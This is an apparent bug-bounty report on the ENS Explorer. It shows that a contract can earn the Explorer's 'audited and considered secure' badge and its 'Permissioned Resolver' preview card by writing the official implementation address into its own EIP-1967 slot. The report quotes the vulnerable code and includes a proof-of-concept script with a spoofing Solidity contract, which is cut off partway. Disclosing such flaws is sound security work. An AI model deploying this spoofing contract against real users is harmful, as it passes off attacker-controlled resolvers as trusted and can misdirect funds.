# 92997 w a medium missing factory check in the permissioned resolver lookup lets any contract get ens s audited and considered secure badge on its page and og card

**Submitted on Sep 13th 2026 at 18:49:20 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92997
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The ENS Explorer's Cloudflare worker renders an ENS-branded Open Graph card for every resolver link and subtitles it "Permissioned Resolver" when it decides the contract is ENS's official resolver. The Explorer page for the same address then prints "This is an instance of the official ENS Permissioned Resolver. It is audited and is considered secure." Both decisions come from one storage word read off the contract itself. An attacker deploys a contract whose constructor writes the official implementation address into that word. From then on ENS's own origin serves a server-rendered PNG naming the attacker's bytecode a Permissioned Resolver, and the Explorer page certifies the same bytecode as audited and secure. The attacker spends one contract deployment and needs no ENS name, no role and no contact with any viewer.

## Vulnerability Details

Target: `immunefi-team/audit-comp-ens` @ `audit-comp-ready`, commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, asset `apps/portal`.

**The plant.** The attacker's constructor runs `sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e)`. The slot is the EIP-1967 implementation slot. The address is `ensPermissionedResolverImpl`, the value the Explorer compares against (`useIsPermissionedResolver.ts:16-23`, `worker/ens.ts:112-115`). The contract holds no `DELEGATECALL` opcode, so it is an instance of nothing.

**The card.** The worker runs first for every page path (`wrangler.jsonc:9-15`). A request for `/resolver/<attacker>` matches `worker.ts:323-332`, and `handleContractPage` rewrites the HTML head with `og:image` set to `https://<host>/og/resolver/<attacker>.png` (`worker.ts:227-239`). A chat or social client unfurling the link fetches that PNG. `worker.ts:137-149` answers it by calling `fetchIsPermissionedResolver`, which runs `getStorageAt` on the subject contract, trims the word to an address and compares it with the known implementation (`worker/ens.ts:121-129`). Its docblock names it the "Worker-side mirror of {@link useIsPermissionedResolver}" (`worker/ens.ts:100`). `true` becomes the subtitle `Permissioned Resolver` (`og-render.ts:314-316`, passed at `:341`), and the card leaves the worker as `image/png` with `Cache-Control: public, max-age=3600, s-maxage=3600` (`og-render.ts:127-132`).

**The page.** `routes/resolver/$address.tsx:13-17` admits any syntactically valid address. `routes/resolver/$address/index.tsx:92-94` renders `ResolverTypeValue` in the Type row. `getIsPermissionedResolver` performs the same raw read (`useIsPermissionedResolver.ts:46-66`), and `true` selects the `AuditedNotice` branch (`ResolverTypeValue.tsx:47-53`), which prints the notice (`ResolverTypeValue.tsx:13-19`) with the product name linked to ensdomains' GitHub. A name the attacker points at the contract carries the same notice on `/<name>/resolver` (`routes/$name/resolver.tsx:175-182`, query at `:294-296`).

**The arrival.** The Explorer's search box, on the home route and in the sidebar, runs `supportsInterface` over eleven ids for any typed address and takes `some(Boolean)` (`useSearchResults.ts:86-95`, ids at `resolverInterfaceIds.ts:1-17`). `true` produces the suggestion "View resolver details" (`buildSearchSuggestions.ts:72-79`), which navigates to `/resolver/$address` (`HomeSearchInput.tsx:69-71`). Any other address gets "View address details" (`buildSearchSuggestions.ts:80-87`). The attacker's contract answers `supportsInterface`, so the attacker picks the branch.

**The missing guard.** The `VerifiableFactory` answers this question. `verifyContract(address)` returns the implementation for a proxy the factory deployed and reverts for any other contract. The Manager requires it before trusting a contract (`directMigrationRoutes.ts:228-253`: `getCode`, `verifyContract` and `getWrappedNode`, all three). The Portal's own resolver picker lists only the factory's `ProxyDeployed` logs (`useUserPermissionedResolvers.ts:46-59`), and the factory ABI sits in the same file as the decode (`permissionedResolver.ts:25-28`). Neither `getIsPermissionedResolver` nor `fetchIsPermissionedResolver` calls the factory.

**The control, on the production build.** On an anvil fork of Sepolia at block 11637092, `verifyContract` returns `0x9eae5c2730a7dd16bdd1dee6421a1b91e3b0365e` for the factory-deployed proxy `0xdaefc63d22d213f79b3c6997cdd2e6cb181051ef` and reverts for the attacker contract `0xe8a133308f421aba4c468a4eaa1b0bc88adb674b`. The Explorer's slot read returns `true` for both. The Portal was built with `vite build` and served by `vite preview`, which runs the worker in workerd (`vite.config.ts:52` loads the Cloudflare plugin outside development mode), with the worker and client RPC URLs on the fork. Attached captures from that build:

* `og-resolver-fake.png`: `GET /og/resolver/0xe8a133308f421aba4c468a4eaa1b0bc88adb674b.png`, `200 image/png`, subtitle "Permissioned Resolver".
* `og-resolver-control-genuine-proxy.png`: the factory proxy, subtitle "Permissioned Resolver".
* `og-resolver-control-plain.png`: `0x1111111111111111111111111111111111111111`, subtitle "Resolver".
* `shots/02-resolver-fake-card-light.png` and `shots/02-resolver-fake-card-dark.png`: the attacker contract's page, Type row with the audited notice. `shots/03-resolver-control-light.png`: "Custom Resolver" for the ordinary address.
* `shots/11-journey-search-fake.png`, `shots/11-journey-search-plain.png`, `shots/12-journey-landed-fake.png`: the search box offers "View resolver details" for the attacker contract and "View address details" for the ordinary address, and Enter lands on the certifying page.

### Vulnerable source code

**1. Every resolver link previews as the worker's resolver card** @ `apps/portal/src/worker.ts:227-229`

```ts
  const imageUrl = subpage
    ? `https://${url.host}/og/${kind}/${encoded}/${encodeURIComponent(subpage)}.png`
    : `https://${url.host}/og/${kind}/${encoded}.png`
```

**2. The card route reads the badge for the requested address** @ `apps/portal/src/worker.ts:137-142`

```ts
  const resolverMatch = decoded.match(OG_RESOLVER_RE)
  if (resolverMatch) {
    const isPermissioned = await fetchIsPermissionedResolver(
      env,
      resolverMatch[1],
    )
```

**3. The badge is one raw storage read on the subject contract** @ `apps/portal/src/worker/ens.ts:121-129`

```ts
    const slotValue = await getStorageAt(client, {
      address: address as Address,
      slot: EIP1967_IMPLEMENTATION_SLOT,
    })

    const implementation = decodeImplementationAddress(slotValue)
    if (!implementation) return false

    return implementation.toLowerCase() === knownImpl
```

**4. `true` becomes the card subtitle** @ `apps/portal/src/worker/og-render.ts:314-316`

```ts
export function resolverSubtitle(isPermissioned: boolean): string {
  return isPermissioned ? 'Permissioned Resolver' : 'Resolver'
}
```

**5. The card is a public, edge-cached PNG** @ `apps/portal/src/worker/og-render.ts:127-132`

```ts
  return new Response(buf, {
    headers: {
      'Content-Type': 'image/png',
      'Cache-Control': 'public, max-age=3600, s-maxage=3600',
    },
  })
```

**6. The certification the page prints** @ `apps/portal/src/features/resolver/components/ResolverTypeValue.tsx:13-19`

```tsx
  <p className="text-p text-foreground">
    This is an instance of the official{' '}
    <ExternalLink href={docsHref} className="underline">
      {name}
    </ExternalLink>
    . It is audited and is considered secure.
  </p>
```

**7. The branch that prints it** @ `apps/portal/src/features/resolver/components/ResolverTypeValue.tsx:47-53`

```tsx
  if (isPermissionedResolver)
    return (
      <AuditedNotice
        name="ENS Permissioned Resolver"
        docsHref="https://github.com/ensdomains/contracts-v2/blob/main/contracts/src/resolver/PermissionedResolver.sol"
      />
    )
```

**8. The page's decision is the same read** @ `apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts:57-66`

```ts
  const implementationAddress = decodeImplementationAddress(
    implementationSlotValue,
  )
  if (!implementationAddress) return ok(false)

  return ok(
    knownPermissionedResolverImplementations.includes(
      implementationAddress.toLowerCase(),
    ),
  )
```

**9. The decode adds no verification** @ `apps/portal/src/features/resolver/utils/permissionedResolver.ts:71-79`

```ts
export const decodeImplementationAddress = (
  storageValue: Hex | null | undefined,
): Address | null => {
  if (!storageValue || storageValue === '0x' || /^0x0+$/.test(storageValue)) {
    return null
  }

  const normalized = storageValue.slice(2).padStart(64, '0')
  const rawAddress = `0x${normalized.slice(24)}` as Address
```

**10. The search box routes the attacker's contract to that page** @ `apps/portal/src/features/dashboard/utils/buildSearchSuggestions.ts:72-78`

```ts
      if (isResolver && navigateToResolver) {
        items.push({
          id: `resolver:${checksum}`,
          label: isMobile ? truncateAddress(checksum) : checksum,
          description: 'View resolver details',
          inputValue: checksum,
          action: () => navigateToResolver(checksum),
```

**11. The check the repo already runs for the same question** @ `apps/manager/src/features/migration/service/directMigrationRoutes.ts:228-235`

```ts
    const [code, implementation, wrappedNode] = await Promise.all([
      params.publicClient.getCode({ address: params.expectedWrapper }),
      params.publicClient.readContract({
        address: V2_CONTRACTS.VerifiableFactory,
        abi: verifiableFactoryAbi,
        functionName: 'verifyContract',
        args: [params.expectedWrapper],
      }),
```

## Impact Details

* **ENS's own card and page certify the attacker's contract as the official, audited Permissioned Resolver.** This is the program's impact row *"Injecting/modifying the static content on the target application without JavaScript (persistent), such as: - HTML injection without JavaScript - Replacing existing text with arbitrary text - Arbitrary file uploads, etc."*, High. In the PoC the card subtitle for the attacker's contract goes from `Resolver` to `Permissioned Resolver`, and the Type row goes from `Custom Resolver` to "This is an instance of the official ENS Permissioned Resolver. It is audited and is considered secure.", one `SSTORE` apart from the control.
* **The false text is ENS's copy.** The attacker writes one storage word and no text. "Official", "audited", "considered secure" and "Permissioned Resolver" are strings the Explorer authors and prints in its own Type row and card subtitle.
* **Every attacker step is permissionless.** One contract deployment from any address. No ENS name, no registration, no role, no allowlist, no contact with the viewer.
* **The viewer has nothing to tell the two apart.** The card for the factory proxy `0xdaefc63d22d213f79b3c6997cdd2e6cb181051ef` and the card for the attacker's contract are the same image apart from the address. The proxy runs the audited `PermissionedResolver` code. The attacker's contract has no `DELEGATECALL` and runs its author's code, which in the PoC answers `addr()` for every name with the author's address. On the page, the `Interfaces` row under the notice lists "Address resolver", "Text records" and "Permissioned resolver", the interfaces the contract claims (`shots/02-resolver-fake-card-light.png`).
* **No JavaScript, and it reaches people who never open the app.** The worker writes the `og:image` tag and renders the PNG on the server, so every client that reads Open Graph shows the card for a posted link. People who do open the Explorer reach the page through its search box, which suggests "View resolver details" for the attacker's address.
* **It persists for the life of the contract.** The certification rests on a storage word set in the attacker's constructor. The contract has no function that writes the slot again, so every card fetch and every page view reprints it.

Dedup note: R2-04 is the other known issue on this worker: *"The Explorer's OG-image worker resolves the avatar text record of the requested name (attacker-controlled for any name they own) and fetches it server-side from our Cloudflare Worker with no host or IP allowlist, giving a limited server-side request forgery primitive."* This report's root cause is the resolver identity check (`worker/ens.ts:121-129` and `useIsPermissionedResolver.ts:46-66`), on the `/og/resolver/` route and on the page. The program's rule: *"Reports that describe the same root cause as an entry below will be treated as duplicates, even if the report describes a different exploitation path or entry point."* and *"Anything not listed here is in scope under the normal competition rules"*.

## References

**The card**

* `apps/portal/wrangler.jsonc:9-15` - `run_worker_first` for `/*`
* `apps/portal/src/worker.ts:323-332` - resolver page requests go to `handleContractPage`
* `apps/portal/src/worker.ts:227-239` - `og:image` set to `/og/resolver/<address>.png`
* `apps/portal/src/worker.ts:112` - `OG_RESOLVER_RE`
* `apps/portal/src/worker.ts:137-149` - card route calls `fetchIsPermissionedResolver` and passes the result to `renderResolverOgImage`
* `apps/portal/src/worker/ens.ts:96-104` - docblock, "Worker-side mirror of {@link useIsPermissionedResolver}"
* `apps/portal/src/worker/ens.ts:105-133` - `fetchIsPermissionedResolver`, raw slot read at `:121-129`
* `apps/portal/src/worker/clients.ts:9-24` - worker client from `env.SEPOLIA_RPC_URL`
* `apps/portal/src/worker/og-render.ts:314-316` - `resolverSubtitle`
* `apps/portal/src/worker/og-render.ts:328-346` - `renderResolverOgImage`, subtitle at `:341`
* `apps/portal/src/worker/og-render.ts:127-132` - `image/png`, `public, max-age=3600, s-maxage=3600`
* `apps/portal/vite.config.ts:52` - Cloudflare plugin loaded outside development mode

**The page**

* `apps/portal/src/routes/resolver/$address.tsx:13-17` - any valid address admitted
* `apps/portal/src/routes/resolver/$address/index.tsx:92-94` - Type row renders `ResolverTypeValue`
* `apps/portal/src/features/resolver/components/ResolverTypeValue.tsx:13-19` - audited notice copy
* `apps/portal/src/features/resolver/components/ResolverTypeValue.tsx:47-53` - `isPermissionedResolver` branch
* `apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts:13-23` - slot constant and the one known implementation
* `apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts:46-66` - `getStorageAt`, decode, compare
* `apps/portal/src/features/resolver/utils/permissionedResolver.ts:71-86` - decode
* `apps/portal/src/routes/$name/resolver.tsx:175-182,294-296` - the same notice on the name page, same query

**The arrival**

* `apps/portal/src/features/dashboard/hooks/useSearchResults.ts:86-95` - `supportsInterface` over the ids, `some(Boolean)`
* `apps/portal/src/lib/constants/resolverInterfaceIds.ts:1-17` - the eleven ids
* `apps/portal/src/features/dashboard/utils/buildSearchSuggestions.ts:72-87` - "View resolver details" and "View address details"
* `apps/portal/src/features/dashboard/components/HomeSearchInput.tsx:69-71` - navigate to `/resolver/$address`
* `apps/portal/src/components/EntityBadge.tsx:182-188,288-291` - contract badges link to `/resolver/$address` on the same test

**The check the repo already has**

* `apps/manager/src/features/migration/service/directMigrationRoutes.ts:228-253` - `getCode`, `verifyContract`, `getWrappedNode`
* `apps/portal/src/features/resolver/hooks/useUserPermissionedResolvers.ts:46-59` - factory `ProxyDeployed` logs
* `apps/portal/src/features/resolver/utils/permissionedResolver.ts:25-28` - `verifiableFactoryAbi`, in the decode's file

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS Explorer: the resolver OG card and the resolver Type row certify any
// contract as the official, audited ENS Permissioned Resolver from one storage
// word the contract writes about itself.
//
//   node poc.mjs          (ENS_REPO defaults to ../../../ens-apps)

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-audited-badge')

const ATTACKER = '0x00000000000000000000000000000000000000A7'
const HONEST = '0x00000000000000000000000000000000000000B0'
const RPC_PORT = Number(process.env.POC_RPC_PORT ?? 8747)
const RPC_URL = `http://127.0.0.1:${RPC_PORT}`

const PKG = `{
  "name": "ens-poc-audited-badge",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ethereumjs/common": "^4.4.0",
    "@ethereumjs/evm": "^3.1.0",
    "@ethereumjs/statemanager": "^2.4.0",
    "@ethereumjs/util": "^9.1.0",
    "@tanstack/react-query": "^5.90.12",
    "@wagmi/core": "^3.6.4",
    "neverthrow": "^8.2.0",
    "react": "^19.2.5",
    "react-dom": "^19.2.5",
    "react-external-link": "^2.6.1",
    "solc": "0.8.28",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

const TSCONFIG = `{ "compilerOptions": { "jsx": "react-jsx", "target": "es2022", "module": "esnext" } }
`

const LOADER = `import { existsSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const PORTAL_SRC = path.join(REPO, 'apps', 'portal', 'src')
const UTILS_SRC = path.join(REPO, 'packages', 'utils', 'src')
const INDEXER = path.join(REPO, 'packages', 'indexer')
const WAGMI_SHIM = pathToFileURL(path.join(HERE, '_wagmi.mjs')).href
const RAW_SHIM = pathToFileURL(path.join(HERE, '_raw.mjs')).href
const OG_SHIM = pathToFileURL(path.join(HERE, '_workers-og.mjs')).href
// lib/wagmi.ts builds a WalletConnect connector; the code under test only needs
// sepoliaWithEns and getClient(), so that one module is replaced.
const REAL_WAGMI = pathToFileURL(path.join(PORTAL_SRC, 'lib', 'wagmi.ts')).href

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

const asFile = (p) => {
  for (const cand of [p + '.ts', p + '.tsx', path.join(p, 'index.ts'), p])
    if (existsSync(cand)) return cand
  return p
}

// path.relative across drives returns an absolute path on Windows.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.endsWith('?raw') || specifier.endsWith('?url'))
    return { url: RAW_SHIM, shortCircuit: true }
  if (specifier === 'workers-og') return { url: OG_SHIM, shortCircuit: true }

  const alias =
    specifier.startsWith('@ens-repo/') ? path.join(REPO, specifier.slice(10)) :
    specifier.startsWith('@ens-apps/utils/') ? path.join(UTILS_SRC, specifier.slice(16) + '.ts') :
    specifier.startsWith('@ens-apps/indexer/') ? path.join(INDEXER, specifier.slice(18) + '.ts') :
    specifier.startsWith('@/') ? asFile(path.join(PORTAL_SRC, specifier.slice(2))) :
    specifier.startsWith('.') && isRepoFile(context.parentURL)
      ? asFile(path.resolve(path.dirname(fileURLToPath(context.parentURL)), specifier)) : null

  if (alias && pathToFileURL(alias).href === REAL_WAGMI)
    return { url: WAGMI_SHIM, shortCircuit: true }

  const resolved = alias
    ? await nextResolve(pathToFileURL(alias).href, context)
    : isRepoFile(context.parentURL) && isBare(specifier)
      ? await nextResolve(specifier, { ...context, parentURL: ANCHOR })
      : await nextResolve(specifier, context)

  if (resolved.url === REAL_WAGMI) return { url: WAGMI_SHIM, shortCircuit: true }
  return resolved
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

const WAGMI = `import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { createPublicClient, http } from 'viem'
import { sepolia } from 'viem/chains'

export const sepoliaWithEns = extendChainWithEns(sepolia)
export const customSepolia = sepolia
export const SEPOLIA_RPC_URL = process.env.POC_RPC_URL
export const WALLETCONNECT_PROJECT_ID = '2d42eb34b815c3019db4943096fcd58a'

const client = createPublicClient({
  chain: sepoliaWithEns,
  transport: http(process.env.POC_RPC_URL),
})
export const wagmiConfig = { getClient: () => client }
`

const RAW = `export default ''
`

const WORKERS_OG = `export class ImageResponse { constructor() { throw new Error('not rendered here') } }
`

const SOL = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract FakeAuditedResolver {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public immutable attacker;

    constructor(address officialPermissionedResolverImpl) {
        attacker = msg.sender;
        assembly { sstore(IMPLEMENTATION_SLOT, officialPermissionedResolverImpl) }
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x3b3b57de || id == 0x59d1d43c || id == 0x91413117;
    }

    function addr(bytes32) external view returns (address) { return attacker; }
}

contract HonestResolver {
    address public immutable deployer;

    constructor() { deployer = msg.sender; }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x3b3b57de || id == 0x59d1d43c || id == 0x91413117;
    }

    function addr(bytes32) external view returns (address) { return deployer; }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: the Explorer certifies any contract as the official, audited')
  console.log('           ENS Permissioned Resolver from a self-writable storage slot')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal', 'src', 'worker'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, 'tsconfig.json'), TSCONFIG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, '_wagmi.mjs'), WAGMI)
  writeFileSync(path.join(WORK, '_raw.mjs'), RAW)
  writeFileSync(path.join(WORK, '_workers-og.mjs'), WORKERS_OG)
  writeFileSync(path.join(WORK, 'Model.sol'), SOL)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  // pnpm nests @noble/hashes (ethereumjs needs ~1.4, viem 2.52 needs ~1.8).
  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, react 19, solc 0.8.28)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO,
             POC_RPC_URL: RPC_URL, NODE_NO_WARNINGS: '1',
             TSX_TSCONFIG_PATH: path.join(WORK, 'tsconfig.json') } })
  process.exit(r.status ?? 1)
}

// ============================================================== a real EVM behind JSON-RPC

const require_ = createRequire(import.meta.url)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address: EvmAddress, hexToBytes, bytesToHex } = await import('@ethereumjs/util')
const { createServer } = await import('node:http')
const { encodeAbiParameters, encodeFunctionData, decodeFunctionResult, getAddress } =
  await import('viem')

const GAS = 30_000_000n
const evmAddr = (a) => new EvmAddress(hexToBytes(a))
const pad32 = (hex) => `0x${hex.replace(/^0x/, '').padStart(64, '0')}`

const compileModel = () => {
  const solc = require_('solc')
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity',
    sources: { 'Model.sol': { content: readFileSync(path.join(WORK, 'Model.sol'), 'utf8') } },
    settings: { optimizer: { enabled: true, runs: 200 },
                outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })))
  const fatal = (out.errors ?? []).filter((e) => e.severity === 'error')
  if (fatal.length) throw new Error(fatal.map((e) => e.formattedMessage).join('\n'))
  return Object.fromEntries(Object.entries(out.contracts['Model.sol']).map(
    ([n, c]) => [n, { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` }]))
}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }

  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Shanghai }), stateManager: sm }), sm)
  }

  async fund(a, wei) {
    const acct = (await this.sm.getAccount(evmAddr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(evmAddr(a), acct)
  }

  async deploy(from, bytecode, abi, args = []) {
    const ctor = abi.find((x) => x.type === 'constructor')
    const data = ctor && args.length
      ? bytecode + encodeAbiParameters(ctor.inputs, args).slice(2)
      : bytecode
    const res = await this.evm.runCall(
      { caller: evmAddr(from), origin: evmAddr(from), data: hexToBytes(data), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error(String(res.execResult.exceptionError))
    return getAddress(res.createdAddress.toString())
  }

  async code(a) {
    const get = this.sm.getCode ?? this.sm.getContractCode
    return bytesToHex(await get.call(this.sm, evmAddr(a)))
  }

  async storage(a, slot) {
    const get = this.sm.getStorage ?? this.sm.getContractStorage
    const raw = await get.call(this.sm, evmAddr(a), hexToBytes(slot))
    return pad32(bytesToHex(raw ?? new Uint8Array()))
  }

  async ethCall(to, data) {
    const res = await this.evm.runCall({
      caller: evmAddr('0x' + '00'.repeat(19) + '01'), origin: evmAddr('0x' + '00'.repeat(19) + '01'),
      to: evmAddr(to), data: hexToBytes(data), gasLimit: GAS })
    const ret = bytesToHex(res.execResult.returnValue)
    if (res.execResult.exceptionError) throw new Error(`reverted ${ret.slice(0, 10)}`)
    return ret
  }

  async call({ to, abi, fn, args = [] }) {
    const ret = await this.ethCall(to, encodeFunctionData({ abi, functionName: fn, args }))
    return decodeFunctionResult({ abi, functionName: fn, data: ret })
  }
}

const serveRpc = (chain, port) => new Promise((resolve_) => {
  const handle = async ({ method, params = [] }) => {
    switch (method) {
      case 'eth_chainId': return '0xaa36a7'
      case 'net_version': return '11155111'
      case 'eth_blockNumber': return '0x1'
      case 'web3_clientVersion': return 'ens-poc/ethereumjs'
      case 'eth_getCode': return chain.code(params[0])
      case 'eth_getStorageAt': return chain.storage(params[0], params[1])
      case 'eth_call': return chain.ethCall(params[0].to, params[0].data ?? params[0].input ?? '0x')
      default: throw new Error(`unhandled ${method}`)
    }
  }
  const one = async (req) => {
    try { return { jsonrpc: '2.0', id: req.id, result: await handle(req) } }
    catch (e) { return { jsonrpc: '2.0', id: req.id, error: { code: 3, message: String(e.message) } } }
  }
  const server = createServer((req, res) => {
    let body = ''
    req.on('data', (c) => { body += c })
    req.on('end', async () => {
      const parsed = JSON.parse(body)
      const out = Array.isArray(parsed) ? await Promise.all(parsed.map(one)) : await one(parsed)
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify(out))
    })
  })
  server.listen(port, '127.0.0.1', () => resolve_(server))
})

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(24)} ${v}`)
const pin = (rel, needle) => {
  if (!readFileSync(path.join(REPO, rel), 'utf8').includes(needle))
    throw new Error(`source pin failed: ${rel} does not contain ${needle}`)
  say(`    [PIN] ${rel}`)
  say(`          ${needle}`)
}

const PORTAL = 'apps/portal/src'
const SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'

act('ACT 1', 'Two contracts on a real EVM, one SSTORE apart')
const c = compileModel()
const chain = await Chain.create()
await chain.fund(ATTACKER, 10n ** 20n)
await chain.fund(HONEST, 10n ** 20n)
const { getChainContractAddress } = await import('@ensdomains/ensjs/chain')
const { sepoliaWithEns } = await import('@/lib/wagmi')
const ensPermissionedResolverImpl = getChainContractAddress({
  chain: sepoliaWithEns, contract: 'ensPermissionedResolverImpl' })
const fake = await chain.deploy(ATTACKER, c.FakeAuditedResolver.bytecode,
  c.FakeAuditedResolver.abi, [ensPermissionedResolverImpl])
const honest = await chain.deploy(HONEST, c.HonestResolver.bytecode, c.HonestResolver.abi)
kv('official impl', `${ensPermissionedResolverImpl}  (ensjs @e96662c)`)
say()
say('    contract    address                                      slot 0x360894a1...382bbc')
for (const [label, a] of [['ATTACKER', fake], ['HONEST  ', honest]])
  say(`    ${label}    ${a}   ${await chain.storage(a, SLOT)}`)
if ((await chain.storage(fake, SLOT)).slice(26) !== ensPermissionedResolverImpl.slice(2).toLowerCase())
  throw new Error('the attacker slot does not hold the official implementation')
if (!/^0x0+$/.test(await chain.storage(honest, SLOT))) throw new Error('control slot is not empty')

const server = await serveRpc(chain, RPC_PORT)
say()
say(`  JSON-RPC on ${RPC_URL}. Every read below is the target's own code over HTTP.`)

act('ACT 2', 'The OG card: server-rendered by the Cloudflare worker, no JavaScript')
pin(`${PORTAL}/worker.ts`, "const resolverRoute = matchContractRoute(pathname, 'resolver')")
pin(`${PORTAL}/worker.ts`, '`https://${url.host}/og/${kind}/${encoded}.png`')
pin(`${PORTAL}/worker.ts`, 'const isPermissioned = await fetchIsPermissionedResolver(')
pin(`${PORTAL}/worker/og-render.ts`, "'Cache-Control': 'public, max-age=3600, s-maxage=3600'")
const { fetchIsPermissionedResolver } = await import(`@ens-repo/${PORTAL}/worker/ens.ts`)
const { resolverSubtitle } = await import(`@ens-repo/${PORTAL}/worker/og-render.ts`)
const env = { SEPOLIA_RPC_URL: RPC_URL }
const fakeWorker = await fetchIsPermissionedResolver(env, fake)
const honestWorker = await fetchIsPermissionedResolver(env, honest)
say()
say('  A link to /resolver/<address> gets og:image /og/resolver/<address>.png.')
say('  The worker answers that PNG with its own slot read and its own subtitle:')
say()
say('    contract     fetchIsPermissionedResolver   card subtitle')
say(`    ATTACKER     ${String(fakeWorker).padEnd(30)}${resolverSubtitle(fakeWorker)}`)
say(`    HONEST       ${String(honestWorker).padEnd(30)}${resolverSubtitle(honestWorker)}`)
if (resolverSubtitle(fakeWorker) !== 'Permissioned Resolver')
  throw new Error('the OG card did not label the attacker contract')
if (resolverSubtitle(honestWorker) !== 'Resolver') throw new Error('control subtitle wrong')

act('ACT 3', "The SPA decision, the target's own hook")
const { getIsPermissionedResolver, getIsPermissionedResolverQueryOptions } = await import(
  `@ens-repo/${PORTAL}/features/resolver/hooks/useIsPermissionedResolver.ts`)
const decide = async (a) => {
  const r = await getIsPermissionedResolver({ resolverAddress: a })
  if (r.isErr()) throw new Error(`getIsPermissionedResolver errored: ${String(r.error)}`)
  return r.value
}
const fakeIsPermissioned = await decide(fake)
const honestIsPermissioned = await decide(honest)
kv('ATTACKER contract', String(fakeIsPermissioned))
kv('HONEST contract', String(honestIsPermissioned))
if (fakeIsPermissioned !== true) throw new Error('the attacker contract was not certified')
if (honestIsPermissioned !== false) throw new Error('the control was certified')

act('ACT 4', "The Type row, the target's own React component")
const ReactNS = await import('react')
const React = ReactNS.default ?? ReactNS
globalThis.React = React
const { renderToStaticMarkup } = await import('react-dom/server')
